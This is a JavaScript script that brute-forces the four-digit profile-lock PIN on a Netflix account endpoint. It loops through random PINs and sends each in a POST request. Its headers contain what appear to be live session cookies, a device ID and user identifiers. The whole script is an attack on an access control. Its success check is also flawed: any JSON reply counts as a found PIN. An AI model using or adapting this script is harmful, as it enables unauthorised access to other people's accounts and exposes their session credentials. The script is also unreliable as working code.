const myHeaders = new Headers();
myHeaders.append("accept", "application/json, text/javascript, */*");
myHeaders.append("accept-language", "en-US,en;q=0.9");
myHeaders.append("content-type", "application/json");
myHeaders.append("origin", "https://www.netflix.com");
myHeaders.append("priority", "u=1, i");
myHeaders.append("referer", "https://www.netflix.com/browse");
myHeaders.append("sec-ch-ua", "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"");
myHeaders.append("sec-ch-ua-mobile", "?0");
myHeaders.append("sec-ch-ua-model", "\"\"");
myHeaders.append("sec-ch-ua-platform", "\"Linux\"");
myHeaders.append("sec-ch-ua-platform-version", "\"6.14.0\"");
myHeaders.append("sec-fetch-dest", "empty");
myHeaders.append("sec-fetch-mode", "cors");
myHeaders.append("sec-fetch-site", "same-origin");
myHeaders.append("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36");
myHeaders.append("x-netflix.browsername", "Chrome");
myHeaders.append("x-netflix.browserversion", "143");
myHeaders.append("x-netflix.client.request.name", "ui/xhrUnclassified");
myHeaders.append("x-netflix.clienttype", "akira");
myHeaders.append("x-netflix.esn", "NFCDCH-LX-LQHKYFKTLMMG1FRADYRAYWM5GMVK7T");
myHeaders.append("x-netflix.esnprefix", "NFCDCH-LX-");
myHeaders.append("x-netflix.nq.stack", "prod");
myHeaders.append("x-netflix.osfullname", "Linux");
myHeaders.append("x-netflix.osname", "Linux");
myHeaders.append("x-netflix.osversion", "0.0.0");
myHeaders.append("x-netflix.request.attempt", "1");
myHeaders.append("x-netflix.request.client.context", "{\"appstate\":\"foreground\"}");
myHeaders.append("x-netflix.request.client.user.guid", "VCQ3ZSMMHZE5DAJV5DVGOH6Y6A");
// myHeaders.append("x-netflix.request.id", "39843c99b4bd43d4968e10684c4073df");
myHeaders.append("x-netflix.uiversion", "v68e3b05a");
myHeaders.append("Cookie", "netflix-sans-normal-3-loaded=true; netflix-sans-bold-3-loaded=true; nfvdid=BQFmAAEBEH7pgVtqCPt7b5xwtjQ_llRgrU6-Y2ThqCJo__oY5ApVwcqslZUiauosQU7kmXC3t014Uxt6fEXrN5Fob7ZpPGmlKkGzH9q8m9G6ImJfqgNc_wTAC2yDl6Ho5voq03fEJbUGKIABR6Hb8GR1WYUGVAbF; pas=%7B%22supplementals%22%3A%7B%22muted%22%3Afalse%7D%7D; OptanonAlertBoxClosed=2025-11-22T21:09:18.376Z; gsid=54069bd2-87aa-48e3-80bb-9f1c37486150; flwssn=fc046c70-3948-4961-b306-403a3b2f4cad; SecureNetflixId=v%3D3%26mac%3DAQEAEQABABTW_hrh2Zvrdp5OKw_YYzxrIZ1_tEq_FF4.%26dt%3D1774211406816; NetflixId=v%3D3%26ct%3DBgjHlOvcAxKUA2hdJneOvqstVpf3cPYPtGuP4KFShZyJk8YGC9gS_vpjnoJ7AtFAGwNus0In5ARXU2ZCMyPLQwJJ-z6FJJ54gD1naUkNp_GZYQBLAwR2iW9fd-4BDozL-7_tf0eYObnVpC1O90JYKLOSE8Ecxc7nQqXMAoOz99UKr78Kc9heEoMSyGsugwTC_mQwnxylmyr-v4ORiz5lVXJNcaKqXoUnWBZC_QybUdnrMqHi-6m7XO08EXh7vGbO-5VBsQk5mO6ouaOlGA_7H3PwheHAFZNqK0oFbPNgHFKbNTWQHCbTdNGODlh8I0htZ0ge5FKBRHbg8R6CcFOLhQYd1KeyeG2H09dVVoPy7THZvHECdgysfBF7xjNYM36jVF5Z0zR0uRJK8EtOFZKrk3J0DetGeSqMGiP_QnqFKk_eNKfS1C88wdKCyRl8TXbFFKaeJyNr9dPEpqHxjGh1Lq1ZddOaycbEEFIfs0uFTBkNHHwCdLPTW7zln-FVASyRuP1DBmY5JihWZusMBUlBDAs1VElmzvhOieEuA1RRGAYiDgoMH9fbrUMkw1SZDqTH%26pg%3DVCQ3ZSMMHZE5DAJV5DVGOH6Y6A%26ch%3DAQEAEAABABTDn8shjIx614X6S9DJQMtNhIZROSdRvlY.; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Mar+23+2026+01%3A35%3A50+GMT%2B0500+(Pakistan+Standard+Time)&version=202601.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=0d09e853-e33f-40f5-b701-95b78bdeb1e7&interactionCount=2&isAnonUser=1&landingPath=NotLandingPage&AwaitingReconsent=false&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A0%2CC0004%3A0&intType=2&geolocation=PK%3BSD");




let pin = null;
let found = false;
let used = new Set();

function generatePin() {
  const pin = Math.floor(Math.random() * 9999).toString().padStart(4, '0');
  if (used.has(pin)) {
    return generatePin();
  }
  used.add(pin);
  return pin;
}

for (let i = 0; i <= 9999; i++) {

  if (found) {
    break;
  }

  pin = generatePin();
  const raw = JSON.stringify({
    "pin": pin,
    "action": "verify",
    "guid": "SSTASLEPHZHBBN7N6NKP4PEJNQ",
    "authURL": "c1.1774211745150.AgiMlOvcAxIgRJ6DprpBpqu76NzMbkrGf4rP4CYUd5EoqpacXuSy7p8YAg=="
  });

  const requestOptions = {
    method: "POST",
    headers: myHeaders,
    body: raw,
    redirect: "follow"
  };

  await fetch("https://www.netflix.com/nq/website/memberapi/release/profileLock", requestOptions)
    .then((response) => response.json())
    .then((result) => {

      found = true;
      console.log(`PIN found: ${pin}`);

    })
    .catch(() => console.warn(`Trying pin: ${pin} (${i}/9999)`));
}
